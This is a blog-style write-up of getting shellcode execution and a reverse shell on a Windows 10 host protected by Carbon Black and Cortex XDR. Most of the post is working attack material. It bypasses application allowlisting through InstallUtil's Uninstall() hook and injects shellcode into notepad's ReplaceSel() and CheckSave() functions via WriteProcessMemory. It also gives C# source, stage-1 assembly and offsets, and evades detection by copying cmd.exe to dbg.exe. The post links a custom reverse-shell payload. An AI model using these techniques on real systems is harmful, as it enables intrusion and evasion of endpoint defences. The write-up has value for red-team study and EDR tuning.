---
layout: default
---
<br/>

# What Is This?
This is the story of getting shellcode execution and a reverse shell on a hardened host in a well-managed (and well-funded) network.

Note that this was primarily an opportunity for me to apply the various techniques I've learned from the courses I've taken recently. The process described here is somewhat contrived, and getting a shell when you already have desktop access is not especially useful, but hopefully there should still be some takeaways if this is a topic that interests you.

<br/>
<hr/>

# Environment
The target host is a fully patched Windows 10 workstation with Carbon Black and Cortex XDR.
- <b>Carbon Black</b>: Aggressive software restriction - prevents execution of unknown executables, including DLLs, VB/JS scripts, and drivers. PowerShell is allowed since it is part of the Windows base system, but see below.
- <b>Cortex XDR</b>: Sophisticated endpoint protection, very effective at detecting and blocking threats.

<br/>
<hr/>

# Carbon Black Kernel Driver
Carbon Black's kernel driver (cbk7.sys), which is loaded at boot time, is able to inspect process creation by calling the `PsSetCreateProcessNotifyRoutine()` Windows API. From MSDN: "The PsSetCreateProcessNotifyRoutine routine adds a driver-supplied callback routine to, or removes it from, a list of routines to be called whenever a process is created or deleted."

To monitor thread creation and image loads, it calls two more similar functions: `PsSetCreateThreadNotifyRoutine()` and `PsSetLoadImageNotifyRoutine()`. (An "image" in this context just means a DLL.)

When the callback function receives a notification, it performs several checks to determine whether it should allow or block the request. Non-allowlisted executables and DLLs will always be blocked.

<br/>
<hr/>

# Approach
The goal is to run arbitrary code on the host to get a reverse shell. Since custom executables, DLLs, and scripts are blocked by Carbon Black, we can try injecting code into an existing process, or one that we're allowed to launch such as notepad since it's a Windows base application. This method is sometimes called "fork & run" where a process is started whose only purpose is to receive an injection of code.

This technique has been known for years and usually consists of the following steps:
- `OpenProcess()` to get a handle to the target process.
- `VirtualAllocEx()` to allocate a read-write-execute buffer in the target process.
- `WriteProcessMemory()` to write the shellcode into the newly allocated buffer in the target process.
- `CreateRemoteThread()` to create a thread in the target process whose entrypoint is the shellcode buffer.

Because this technique is so well-known, nearly all AV/EDR products will closely monitor these functions using hooks. Calling these four functions in sequence will usually result in a detection, so it's better to find different ways to achieve the same outcome. As we'll see, obtaining a reverse shell under Carbon Black and Cortex XDR was possible using only two of the four functions above (`OpenProcess()` and `WriteProcessMemory()`).

<br/>
<hr/>

# PowerShell
PowerShell is fairly simple and does not require compilation or any extra tools, so it's the obvious first choice. The general approach with PowerShell is to import Windows API functions using the `Add-Type` cmdlet, then call them as usual from within PowerShell.

```powershell
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, uint bInheritHandle, uint dwProcessId);
    ...snip...
}
'@
...snip...

$Flags = 0x28 # aka (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)
$hProcess = [Kernel32]::OpenProcess($Flags, $False, $Notepad.Id)
```
<p style="text-align: center; font-size: 12px;">Importing and calling Windows API functions in PowerShell</p>

While Carbon Black generally leaves PowerShell alone because it is an allowlisted application, Cortex does not. In fact, the moment the `Add-Type` cmdlet is executed with the `DllImport` directive, Cortex kills the PowerShell process. It may be possible to obfuscate the `Add-Type` arguments, but this seems like a losing battle.

I did try disabling AMSI, but Cortex seems to be using its own inspection engine and not relying on AMSI, which is probably a good decision since AMSI is notoriously easy to disable. See [https://amsi.fail](https://amsi.fail).

<br/>
<hr/>

# The Story So Far
We can't run exes. We can't load DLLs. We can't use VBScript or JScript. We can't use PowerShell to import Windows functions. Fortunately, there is one avenue left to explore that may allow us import and call the Windows APIs above needed to run shellcode.

<br/>
<hr/>

# InstallUtil
`InstallUtil` is a Windows base application that is used for installing and uninstalling software. Its only functionality we're interested in is its `/u` option which is used to uninstall applications.

When applications are built in C#, developers have the ability to add in two special functions: `Install()` and `Uninstall()`. These functions are never called internally, but instead are used to perform any initialization needed when installing, and any cleanup needed when uninstalling. We will focus on `Uninstall()` because it does not require administrator privileges.

We are of course not concerned with actually uninstalling anything - the only reason this is useful is because it should let us run arbitrary C# code to perform the process injection. Even though we can't run our exe directly, we can still put code in the `Uninstall()` function and then use `installutil /u myapp.exe` to force Windows to call it for us, bypassing Carbon Black's restrictions.

<br/>
<hr/>

# PoC #1

```csharp
using System;
using System.Collections;
using System.Diagnostics;
using System.Configuration.Install;
using System.IO;
using System.Runtime.InteropServices;

namespace IU
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // empty Main - never called
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Bypass : System.Configuration.Install.Installer
    {
        // Uninstall() gets called by InstallUtil when /u is specified
        public override void Uninstall(IDictionary savedState)
        {
            // Spawn notepad.exe
            Process p = new Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
            p.StartInfo.CreateNoWindow = false;
            p.Start();
        }
    }
}
```
<p style="text-align: center; font-size: 12px;">PoC that successfully launches notepad.exe</p>

When we build this app (now referred to as `iu.exe`), upload it to the target system, then do `installutil /u iu.exe`, we see a new instance of notepad.exe pop up, proving that the `Uninstall()` function was executed. We can now build on this PoC to try injecting code into notepad.exe.

<br/>
<hr/>

# An Alternative to VirtualAllocEx()
```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

Code injection will always require a memory buffer in the target process that is marked as executable. This is achieved either by passing the `PAGE_EXECUTE_READWRITE` constant to `VirtualAllocEx()` at allocation time, or by calling `VirtualProtect()` (with the same constant) to change the permissions on an existing memory region. Ideally, we don't want to do either of these things, because allocating memory marked as executable is a red flag to EDR.

We'll give Cortex its due credit by not even attempting the traditional steps described in the previous section. Instead, we'll use Windbg to examine the memory regions in the notepad.exe process (the injection target).

```
0:006> !address
                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

        BaseAddress      EndAddress+1        RegionSize     Type       State       Protect
-------------------------------------------------------------------------------------------------
<snip>
      7ff7`e7f20000     7ff7`e7f21000        0`00001000 MEM_IMAGE   MEM_COMMIT                                     
      7ff7`e7f21000     7ff7`e7f46000        0`00025000 MEM_IMAGE   MEM_COMMIT  PAGE_EXECUTE_READ                  
      7ff7`e7f46000     7ff7`e7f50000        0`0000a000 MEM_IMAGE   MEM_COMMIT                                     
      7ff7`e7f50000     7ff7`e7f53000        0`00003000 MEM_IMAGE   MEM_COMMIT                                     
      7ff7`e7f53000     7ff7`e7f58000        0`00005000 MEM_IMAGE   MEM_COMMIT                                     
<snip>
```
<p style="text-align: center; font-size: 12px;">Output of the Windbg !address command (edited for brevity)</p>

In the output above we can see that one of the memory regions is marked as `PAGE_EXECUTE_READ`. This means that data in this region can be treated as instructions executed by the CPU, whereas regions without this protection cannot. If we can manage to write our shellcode somewhere in this region, we can move on to worrying about how to execute it.

<br/>
<hr/>

# WriteProcessMemory()
```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

You may have noticed that the region's protection is `PAGE_EXECUTE_READ` instead of `PAGE_EXECUTE_READWRITE`, so how are we going to write to it? Not to worry - an undocumented feature of `WriteProcessMemory()` is that it ignores protection flags and will write to memory that is not marked as writable.

From MSDN: "`WriteProcessMemory()` copies the data from the specified buffer in the current process to the address range of the specified process. Any process that has a handle with `PROCESS_VM_WRITE` and `PROCESS_VM_OPERATION` access to the process to be written to can call the function."

![memaccess](/images/memaccess.png)
<p style="text-align: center; font-size: 12px;">Partial list of memory protection constants</p>

According to this documentation, we need to have a handle to the process which has the `PROCESS_VM_WRITE` (`0x20`) and `PROCESS_VM_OPERATION` (`0x8`) flags. When these are OR'd together, we get `0x28`, which is what we'll pass to the call to `OpenProcess()` as the `dwDesiredAccess` parameter. For reference, the function signature of `OpenProcess()` looks like this:

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```

<br/>
<hr/>

# Code Cave
The plan so far is to call `OpenProcess()` to get a handle to the notepad.exe process, then call `WriteProcessMemory()` to write shellcode somewhere in the RX region described above. But where exactly?

When the compiler builds an .exe, it allocates the memory regions in chunks. This means that most of the time there will be an area at the end of the region that is empty and is the perfect place to store code without clobbering any existing functions/instructions which may crash the application. This is known as a "code cave".

According to the output of `!address` above, the region we're interested in ends at address `0x7ff7e7f46000`, so let's examine the memory just before the ending address. We can start by examining the memory 2048 bytes before the end of the region:

```
0:006> db 7ff7`e7f46000-0x800
00007ff7`e7f45800  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45810  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45820  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45830  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45840  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45850  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45860  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00007ff7`e7f45870  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```
<p style="text-align: center; font-size: 12px;">Displaying the area of memory before the end boundary</p>

Not surprisingly, the last 0x800 (2048) bytes in this region are empty, so we could potentially write our shellcode anywhere in this area without clobbering existing code.

Just for demonstration purposes, if we go back even further, we'll run into some of notepad's actual live code, so this is too far back (unless we don't mind clobbering existing code which is also an option):
```
0:006> db 7ff7`e7f46000-0x1000
00007ff7`e7f45000  4c 8b 84 24 80 00 00 00-4c 8b 8c 24 88 00 00 00  L..$....L..$....
00007ff7`e7f45010  48 83 c4 68 eb 00 ff e0-cc cc cc cc cc cc cc cc  H..h............
00007ff7`e7f45020  48 83 ec 28 4d 8b 41 38-48 8b ca 49 8b d1 e8 11  H..(M.A8H..I....
00007ff7`e7f45030  00 00 00 b8 01 00 00 00-48 83 c4 28 c3 cc cc cc  ........H..(....
00007ff7`e7f45040  cc cc cc cc 40 53 45 8b-18 48 8b da 41 83 e3 f8  ....@SE..H..A...
00007ff7`e7f45050  4c 8b c9 41 f6 00 04 4c-8b d1 74 13 41 8b 40 08  L..A...L..t.A.@.
00007ff7`e7f45060  4d 63 50 04 f7 d8 4c 03-d1 48 63 c8 4c 23 d1 49  McP...L..Hc.L#.I
00007ff7`e7f45070  63 c3 4a 8b 14 10 48 8b-43 10 8b 48 08 48 8b 43  c.J...H.C..H.H.C
```
<p style="text-align: center; font-size: 12px;">Displaying memory containing live code</p>

This is not a problem since 2048 bytes is plenty of space for most shellcode. We know we can write starting at 0x800 bytes before the end of the RX region (our code cave), so can we just hardcode that address in our call to `WriteProcessMemory()`? Of course not!

<br/>
<hr/>

# Dealing with ASLR
From Wikipedia: "Address space layout randomization (ASLR) is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities. In order to prevent an attacker from reliably redirecting code execution to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries."

Every time Windows boots, ASLR randomizes the base addresses of modules, so we need to deal with bases and offsets instead of absolute addresses. Knowing the offset of 0x800 from the end of the region is a good start; we just need to know the base address of the process.

Conveniently, C# allows us to retrieve the base address of the notepad.exe process:

```csharp
    // Spawn notepad.exe
    Process p = new Process();
    p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
    p.StartInfo.CreateNoWindow = false;
    p.Start();

    // Get the base address of notepad.exe
    IntPtr NotepadBase = p.MainModule.BaseAddress;
```

We just need to calculate the offset from the base address of notepad.exe to 0x800 bytes before the end of the RX region, so:

```
0:006> ? 7ff7`e7f46000 - 0x800 - notepad
Evaluate expression: 153600 = 00000000`00025800
```

Now with the base and the offset, we can calculate the absolute address of the code cave with:
```csharp
    IntPtr NotepadBase = p.MainModule.BaseAddress;
    IntPtr WriteAddress = NotepadBase + 0x25800;
```

<br/>
<hr/>

# PoC #2
Now that we can dynamically calculate the absolute address to write our shellcode to, we'll update the `Uninstall()` function to import the required functions and then call them. We won't get greedy yet by trying to call `CreateRemoteThread()` - it's better to make small incremental changes to more easily figure out what went wrong or what got detected/blocked.

```csharp
[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, uint bInheritHandle, uint dwProcessId);
[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out Int32 lpNumberOfBytesWritten);

public override void Uninstall(IDictionary savedState)
{
    // Read in msgbox shellcode from disk
    byte[] Shellcode = File.ReadAllBytes("c:\\temp\\msgbox.bin");

    // Spawn notepad.exe
    Process p = new Process();
    p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
    p.StartInfo.CreateNoWindow = false;
    p.Start();

    // Get the base address of notepad.exe and add the offset to the RX region (code cave)
    IntPtr NotepadBase = p.MainModule.BaseAddress;
    IntPtr WriteAddress = NotepadBase + 0x25800;

    // Open a handle to the process
    // (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) == 0x28
    IntPtr hProcess = OpenProcess(0x28, 0, (uint)p.Id);

    bool ret = false;
    int lpNumberOfBytesWritten = 0;
    ret = WriteProcessMemory(hProcess, WriteAddress, Shellcode, Shellcode.Length, out lpNumberOfBytesWritten);
}
```

Now rebuild, upload `iu.exe` to the target system, and `installutil /u iu.exe` to trigger `Uninstall()`, and we get no alerts from Cortex. It seems we can write our shellcode to the code cave inside notepad.exe. As a reminder, writing directly to memory already marked as executable saves us from having to allocate RX memory ourselves with `VirtualAllocEx()`, which is risky.

Note: We're storing the shellcode in a file on disk, which is not ideal. The reason I did this is because it saves having to rebuild and re-upload `iu.exe` if the shellcode embedded inside it changes. And since Cortex wasn't detecting the shellcode file on disk, it's not a big deal (it's just MessageBox shellcode at this point).

With our shellcode where we want it, we can now try to introduce and call `CreateRemoteThread()` to execute it.

<br/>
<hr/>

# CreateRemoteThread
```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

We make two small updates to the C# code:

```csharp
    [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    ...

    ret = WriteProcessMemory(hProcess, WriteAddress, Shellcode, Shellcode.Length, out lpNumberOfBytesWritten);

    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, WriteAddress, IntPtr.Zero, 0, IntPtr.Zero);
```

<br/>
Rebuild, re-upload, run. And...
<br/><br/>

![alert](/images/alert.png)

Oh no! Cortex does not like the call to `CreateRemoteThread()`. This means that putting our shellcode in a code cave won't work because we have no way of redirecting execution to that address, since our plan was to use `CreateRemoteThread()` and pass it an entrypoint pointing at the code cave.

<br/>
<hr/>

# The Story So Far
We had our shellcode in a code cave at a known address (base plus offset), but when we tried to `CreateRemoteThread()` to execute it, Cortex became uncomfortable and killed our notepad process. Creating a separate thread inside notepad to run the shellcode is nice because it has the benefit of keeping notepad alive and responsive, but is actually not necessary. After all, notepad is a sacrificial process in this scenario, so as long as our shellcode runs, we don't care if notepad crashes afterward.

<br/>
<hr/>

# An Alternative to CreateRemoteThread()
Instead of creating a thread to execute our shellcode, we can try to use notepad's UI functionality to make it call a specific function. For example, let's pretend there's a `ShowAbout()` function inside notepad that gets called when the user clicks Help -> About Notepad. We could modify our C# code to write our shellcode at the address of `ShowAbout()`, completely clobbering the function's instructions, then click on Help -> About Notepad to trigger the `call` to this function where our shellcode is waiting to be executed.

While there is nothing quite as obvious as `ShowHelp()`, we can use IDA to look for a function whose name could give a hint as to when it will be called:

![replacesel](/images/replacesel.png)
<p style="text-align: center; font-size: 12px;">IDA displaying notepad's functions</p>

It is reasonable to assume that `ReplaceSel()` might mean "replace selection", which could be triggered when the user hits ctrl-H to do a text search/replace. We can test this assumption by setting a breakpoint on `notepad!ReplaceSel` in Windbg and then doing a search/replace:

![replacesel2](/images/replacesel2.png)
<p style="text-align: center; font-size: 12px;">Windbg breakpoint on ReplaceSel()</p>

Confirmed - we can force a call to `ReplaceSel()` by hitting the Replace button in the Replace dialog. This allows us to redirect execution to an address we can calculate at runtime (base plus offset) without ever having to call `CreateRemoteThread()`. Looking at the table of functions above, we can see that IDA shows `ReplaceSel()`'s address as `0x00000001400157a8`. Note that because IDA does not (cannot) take ASLR into consideration, it defaults to a base address of `0x0000000140000000`. Knowing this, we can see that the offset from notepad's base to `ReplaceSel()` is `0x157a8`.

It is worth pointing out that the the address of the `ReplaceSel()` function in the Windbg screenshot ends in `eb38` and not `57a8` as you might expect, since we just said its offset is `0x157a8`. This is only because IDA is showing the version of notepad.exe from the target system, while Windbg is running my local version of notepad.exe, and there's no guarantee that functions will be at the same address across different versions of the same application.

<br/>
<hr/>

# Skipping Ahead
After updating the `Uninstall()` function to write the shellcode to the address of `ReplaceSel()` (instead of the code cave), then triggering the shellcode in the Replace dialog, I was able to get the MessageBox shellcode to run, and got my message box.

This was a successful proof of concept, but it seemed incomplete until I got a reverse shell. Two more hurdles had to be overcome first.

<br/>
<hr/>

# More Failure
Because the shellcode file is stored on disk, all I had to do was replace the MessageBox shellcode file with a reverse shell shellcode file. I opted to use a [custom reverse shell payload](revshell.py) instead of one from `msfvenom` which would get caught on disk.

After switching to the reverse shell shellcode file, I was all set to receive my reverse shell, but notepad crashed instead. I suspected that the shellcode was too long and was clobbering code beyond the `ReplaceSel()` function, causing notepad to crash. For reference, the reverse shell shellcode is about twice as long as the MessageBox shellcode.

<br/>
<hr/>

# Enter Stage 2
At this point I could have tried to find a function besides `ReplaceSel()` that was long enough to take the entire shellcode without clobbering the function behind it, but it felt easier to just split it into two stages because I liked the way it could be triggered through the Replace dialog. Instead of placing the shellcode in `ReplaceSel()`, I found another function (`CheckSave()`) that was long enough to store the entire reverse shell shellcode.

Now, when `ReplaceSel()` is called, its only job is to calculate the address of `CheckSave()` and do an unconditional `jmp` to that address, where the full shellcode would run.

Using IDA, I found the offset of `CheckSave()` to be `0x3690` from the base address of notepad, so the custom "stage 1" shellcode was:

```asm
    xor   eax, eax                              # zero rax
    mov   rax, gs:[rax+0x60]                    # PEB into rax
    mov   rax, qword ptr [rax+0x10]             # ImageBaseAddress into rax
    add   rax, 0x3690                           # offset to CheckSave()
    jmp   rax                                   # jmp to CheckSave()
```

<br/>
<hr/>

# Almost There
After updating `Uninstall()` to use two stages, the final C# code was:

```csharp
public override void Uninstall(IDictionary savedState)
{
    byte[] Stage1 = File.ReadAllBytes("c:\\temp\\stage1.bin");
    byte[] Stage2 = File.ReadAllBytes("c:\\temp\\stage2.bin");

    // Spawn notepad.exe
    Process p = new Process();
    p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
    p.StartInfo.CreateNoWindow = false;
    p.Start();

    // Get the base address of notepad.exe
    IntPtr NotepadBase = p.MainModule.BaseAddress;

    // Open a handle to the process with appropriate permissions
    // (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) == 0x28
    IntPtr hProcess = OpenProcess(0x28, 0, (uint)p.Id);

    bool ret = false;
    int lpNumberOfBytesWritten = 0;

    // Stage1: Address of ReplaceSel()
    IntPtr ReplaceSel = NotepadBase + 0x157a8;
    ret = WriteProcessMemory(hProcess, ReplaceSel, Stage1, Stage1.Length, out lpNumberOfBytesWritten);

    // Stage2: Address of CheckSave()
    IntPtr CheckSave = NotepadBase + 0x3690;
    ret = WriteProcessMemory(hProcess, CheckSave, Stage2, Stage2.Length, out lpNumberOfBytesWritten);

    // Spin here until notepad.exe exits
    WaitForSingleObject(hProcess, 0xffffffff);
}
```

<br/>
<hr/>

# One Last Thing
This time running `installutil /u iu.exe` caused the dreaded Cortex pop-up. This time, I suspected that Cortex was uncomfortable with the fact that `cmd.exe` was spawned with a network socket as its stdin and stdout handles.

Fortunately, this was a quick fix because Cortex is likely only performing this check for command interpreters like `cmd.exe` and `powershell.exe` which means `dbg.exe` should slip under the radar.

```
C:\Windows\system32>copy cmd.exe dbg.exe
        1 file(s) copied.
```

The reverse shell shellcode was updated to spawn `dbg.exe` instead of `cmd.exe`, `installutil /u iu.exe` was run, and after hitting the Replace button ...

<br/>
<hr/>

# Success
![win](/images/win.png)
<p style="text-align: center; font-size: 12px;">Reverse shell established</p>

The end. Thanks for reading.
<br/>
-rw

<br/>
<hr/>
